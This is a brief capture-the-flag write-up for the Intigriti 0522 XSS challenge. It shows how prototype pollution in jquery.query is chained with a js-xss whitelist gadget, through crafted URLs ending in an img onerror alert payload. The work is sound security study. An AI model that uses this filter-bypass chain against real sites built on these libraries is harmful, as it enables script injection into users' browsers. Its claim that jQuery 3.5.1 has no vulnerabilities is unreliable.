+ Looking at the source code, we can see three scripts.
+ One is the js-xss/0.3.3/xss-min.js. This version is vulnerble to DOS attack. So, we dont need to look much in that way
+ then comes jquery 3.5.1 . which is the latest version so no vulnerabilities.
+ then comes, Jquery.query, version2.2.3 which is vulnerable to client side prototype pollution.
+ The only parameter we have is the page parameter.
+ ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/b4c54925-fa6b-4dab-8fdd-2b94e7f02528)
https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/jquery-query-object.md
+ As we polluted the object in the above case, lets try to do with the page parameter
+ payload: https://challenge-0522.intigriti.io/challenge/challenge.html?page[__proto__][5]=Subscribe&page=5
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/4e53b8e0-c5cf-40ec-98f9-3ab096513b28)
+ The output is getting reflected. Lets try giving some simple xss payload as follows:
+ payload: https://challenge-0522.intigriti.io/challenge/challenge.html?page[__proto__][5]=%3Cimg%20src=x%20onerror=alert(document.domain)%3E&page=5
+ When we give the above payload, we can see the our payload gets filtered.
from the following code we can understand that filterxss function is present.
```
var pl = $.query.get('page');
  if(pages[pl] != undefined){
    console.log(pages);
    document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);
  }else{
    document.location.search = "?page=1"
  }
```
+ https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/js-xss.md
+ final payload:
`https://challenge-0522.intigriti.io/challenge/challenge.html?page[__proto__][5]=%3Cimg%20src=x%20onerror=alert(document.domain)%3E&page=5&__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src
